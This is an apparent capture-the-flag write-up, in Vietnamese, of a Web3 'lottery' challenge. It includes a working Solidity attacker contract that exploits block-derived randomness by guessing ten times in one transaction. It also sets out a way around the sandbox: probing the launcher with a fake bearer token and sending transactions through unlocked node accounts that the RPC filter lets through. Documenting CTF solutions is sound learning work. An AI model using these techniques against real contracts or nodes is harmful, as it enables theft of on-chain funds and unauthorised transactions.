# lottery — Web3 (299 pts)

**Flag:** `CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}` · **Files:** `Lottery.sol` 1153 B sha256 `38f58ac2...`, `Setup.sol` 314 B sha256 `ebb2b795...`

## Đề bài

Đề cho hai file Solidity và một dịch vụ nc `34.116.80.78:31338`. `Lottery.sol` giữ một chuỗi thắng: mỗi lần gọi `guess(_guess)` contract tính `target = random() % 100`, đúng thì `streaks[msg.sender] += 1`, sai thì đưa về 0; đủ 10 thì `winner = msg.sender`. `Setup.sol` chỉ có một điều kiện thắng:

```solidity
function isSolved() external view returns (bool) {
    return lottery.winner() != address(0);
}
```

nc là bộ ba hành động `1 launch new instance` / `2 kill instance` / `3 get flag`; hành động 1 in ra uuid, RPC, private key và địa chỉ Setup. Ticket là tên đội, và đề cảnh báo "case-sensitive".

## Phân tích ban đầu

Ba chỗ trong `Lottery.sol` định hướng luôn:

- `random()` là `view`, không nhận tham số, và chỉ băm `blockhash(block.number - 1)`, `block.timestamp`, `block.difficulty`. Trong một transaction, cả ba giá trị đó không đổi, nên `random()` trả cùng một số ở mọi lần đọc trong cùng tx.
- `guess()` tự tính lại `target = random() % 100` bằng đúng công thức trên, không có salt riêng, không có lưu trữ bí mật.
- Không có `require` nào giới hạn số lần `guess` trong một tx, cũng không có kiểm tra `tx.origin`.

Điều kiện thắng `winner != address(0)` không nhắc gì tới địa chỉ player, nên winner là một contract trung gian vẫn hợp lệ. Hai chi tiết này ghép lại thành lời giải: một tx duy nhất, vòng 10 lần `{ t = random()%100; guess(t) }`.

Instance thật là mainnet fork chứ không phải chuỗi trắng: `eth_chainId` trả `0x1`, `eth_blockNumber` trả `26096389`. `block.difficulty` của anvil là 0 và điều đó không ảnh hưởng gì tới hướng đã chọn, vì lời giải không cần biết giá trị đó.

## Các hướng đã loại

Trước khi chốt đã kiểm tra và loại các kênh sau (log đầy đủ ở `notes.md`):

1. **Đoán bằng `eth_call random()` ở block `latest` rồi gửi tx `guess` riêng**: 0/8 đúng, và sai có quy luật. Giá trị `target` của tx vừa rơi vào block lại đúng bằng dự đoán của vòng kế tiếp, tức `eth_call` mô phỏng ở context block hiện tại còn tx thì nằm ở block kế tiếp. Loại.
2. **`eth_call` ở block `pending` rồi gửi tx**: 0/12 với anvil auto-mine, 0/6 với biến thể khác. Trên anvil có `--block-time 3` vẫn 0/12, và 10 tx xếp hàng bằng nonce cũng không chui được vào cùng một block (bốn mươi giây cho 10 block, `streaks` trả 0). Loại.
3. **Tự tính keccak của block kế tiếp ngoài chain** (`blockhash(tip)` và timestamp đoán trước): đo được `block.timestamp` của anvil tăng 0 hoặc 1 giây tuỳ lúc, không có hàm nào dự đoán được delta, nên không dựng được ứng viên. Loại.
4. **So bytecode runtime của Setup on-chain với bản compile local**: `False`, do solc của tác giả khác bản 0.8.20 local nên metadata hash lệch. Phép so này vô dụng; thay bằng gọi getter `lottery()`, và chỉ dùng kích thước để đối chiếu (726 byte, khớp cả trên instance thật lẫn trên replica local dựng từ đúng file đề cho).
5. **Chờ launcher hồi rồi lấy lại 4 dòng response**: không cần và cũng không có; response bị cắt (xem Bước 2), và thể thức nc là một hành động một kết nối nên không đọc tiếp được.

## Chuỗi khai thác

**Bước 1 - Contract đoán trong cùng transaction.** Toàn bộ chuỗi 10 lần thắng nằm trong một tx, vì chỉ khi đó `random()` mới là hằng số:

```solidity
contract Attacker {
    address public immutable lottery;
    constructor(address _lottery) { lottery = _lottery; }
    function run(uint256 _n) external {
        for (uint256 i = 0; i < _n; i++) {
            uint256 target = ILottery(lottery).random() % 100;
            ILottery(lottery).guess(target);
        }
    }
}
```

Trên replica local với đúng `Setup.sol` của đề: `run(10)` tiêu 117.955 gas, `winner` đổi thành địa chỉ attacker, `isSolved()` trả `true`.

**Bước 2 - Instance và response bị cắt.** Launcher hỏng từ 13:50 tới 15:51: hành động `1` in traceback `json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)` ở `eth_sandbox/launcher.py:99`, tức `/new` trả body không phải JSON. Trong thời gian đó `GET http://34.116.80.78:8546/` vẫn trả `sandbox is running!`, và một `POST /new` với bearer giả vẫn trả JSON sạch, nên route còn sống và chỗ hỏng nằm ở nhánh sau khi xác thực:

```
http=200 bytes=32 type=application/json
{"error":"nice try","ok":false}
```

Khi `1` chạy lại được, server in được hai dòng đầu rồi im lặng:

```
uuid:           17d5c78a-b92e-480c-aa67-4d60eb754b44
rpc endpoint:   http://34.116.80.78:8546/17d5c78a-b92e-480c-aa67-4d60eb754b44
```

Không có `private key`, không có `setup contract`. Instance vẫn sống, nên đi tiếp mà không launch lại.

**Bước 3 - Gửi tx không cần private key.** `server.py` của sandbox lọc method theo namespace và chỉ chặn `eth_sendUnsignedTransaction`; `anvil_*` bị từ chối (`invalid request`) nhưng `eth_sendTransaction` được đi qua. Anvil khởi động với account unlocked, nên chính node ký hộ:

```
-- accounts
["0xacccf717a6a03135d282e3b2767210106c7eab1c","0x6fbc29b5519b8e3f757f950e80db05af5dcb000e"]
-- sendTransaction allowed?
{"jsonrpc":"2.0","id":3,"result":"0x2468973e8cf8f206bd15b21ae47fae613a9d9f3fc22814ccf1253463f7ca53bf"}
```

`accounts[0]` là deployer mà launcher dùng để dựng Setup, `accounts[1]` là player; cả hai 5000 ETH (`0x10f0cf064dd59200000`).

**Bước 4 - Suy ra địa chỉ hợp đồng.** Setup do deployer tạo với nonce 0, còn Lottery do Setup tạo với nonce 1, nên tính được bằng số học CREATE mà không cần response:

```python
def create_address(sender, nonce):
    h = keccak.new(digest_bits=256)
    h.update(rlp.encode([bytes.fromhex(sender[2:]), nonce]))
    return to_checksum_address("0x" + h.digest()[12:].hex())
```

Địa chỉ suy ra có 726 byte code và trả về một địa chỉ khác khi gọi `lottery()`, tức đúng là Setup của bài:

```
candidate 0xE5Bf39E2a633f350eA183716b898b601530cBc85 code 726 bytes -> lottery() 0x13b4Edba63FAcaDC68232DAFDAaF31f76Ca72A3b
```

**Bước 5 - Chạy chuỗi thắng.** Deploy `Attacker(lottery)` từ `accounts[1]`, gọi `run(10)`:

```
Attacker deployed: 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2 status 0x1
run(10) status: 0x1 gasUsed: 135055
winner: 0xF9351e4ad9D74d9683ABc494a4AA389C0F1A98C2
isSolved: True
```

**Bước 6 - Lấy cờ.** Cờ không nằm trên chain; `get_flag` đọc file `/tmp/<team_id>` mà launcher ghi khi deploy Setup thành công, rồi tự gọi `isSolved()` qua RPC. Hanh động `3` dùng đúng ticket đã launch:

```
>> 3
ticket please:
>> R3:TURИ
CSS{U5E_4_R4ND0M_FUNCT10N}
```

**Bước kiểm chứng.** `3` được gọi hai lần (15:55:15 và 15:56:03) và in ra cùng một chuỗi. Nội dung chuỗi tự xác nhận cơ chế: `U5E_4_R4ND0M_FUNCT10N` là "USE A RANDOM FUNCTION", đúng cái tên hàm mà bài dựa vào. Sau đó `2` + ticket trả `Instance killed`, xác nhận ticket đúng và instance đã thuộc về mình từ đầu.

## Flag

```bash
python exploit.py http://34.116.80.78:8546/17d5c78a-b92e-480c-aa67-4d60eb754b44 "R3:TURИ"
```

```
CSS{U5E_4_R4ND0M_FUNCT10N}
nop len scoreboard: CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}
```

## Reproduce

```bash
python exploit.py <rpc-endpoint-cua-instance> "<ten doi>"
```

Không cần private key, không cần setup address: script lấy account từ node, suy ra Setup bằng CREATE, xác nhận bằng getter, deploy `analysis/Attacker.sol` và tự gọi nc hành động 3 để in cờ. Muốn thử offline thì dựng replica bằng đúng tham số launcher:

```bash
anvil --chain-id 31337 --block-base-fee-per-gas 0 --accounts 2 --balance 5000
```
